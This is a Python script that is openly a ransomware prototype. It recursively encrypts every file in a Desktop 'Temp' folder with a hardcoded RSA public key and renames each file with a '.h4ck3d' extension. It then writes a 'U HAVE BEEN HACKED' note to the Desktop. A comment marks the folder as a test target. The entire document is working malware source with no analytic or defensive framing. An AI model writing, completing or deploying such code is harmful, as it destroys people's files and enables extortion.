import rsa_file
import rsa
import pathlib
import os
def encrypt_files(all_files) :
    for file in all_files :
        rsa_file.encrypt_file_pkc1_v1_5(file, file, pub_key )
        with open(file, 'a') as f: 
            f.write(pub)

    for file in all_files :
        os.rename(file, file+".h4ck3d")

pub_key = 29944648864618774479486823424589371468880432023648456619313853243976330065812352266033686241919975610859683985655799579723204196180203513927031213471953024776156566402117068589249262961725536690656375819468853655201956328785440286855620533869278857014264853054317679920538242004531706321290837139236413328520827605487479957981224861880281876000430739649790820713519027689637064457251763625253635894666511877456865678035752862536514764306033590610404772072904477554950596118758112872751137682586007093572907235162802141318700294711732374768541933593457973247006274185668861039691739386489613535745843353979184843065731, 65537

pub = rsa.public_key_pem(*pub_key)
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
filename= desktop+'\\Temp\\' # Pour Tester
all_user = pathlib.Path(filename)
all_files = []
for item in all_user.rglob("*"):
    if item.is_file() :
        all_files+=[str(item.absolute())]
divided = []
for i in range(0, len(all_files),len(all_files)//4) :
    divided += [all_files[i:i+len(all_files)//4]]

for files in divided :
    encrypt_files(files)
with open(desktop+"\\h4ck3d.txt", 'w') as f :
    f.write("U HAVE BEEN HACKED, ALL DATA IS ENCRYPTED")






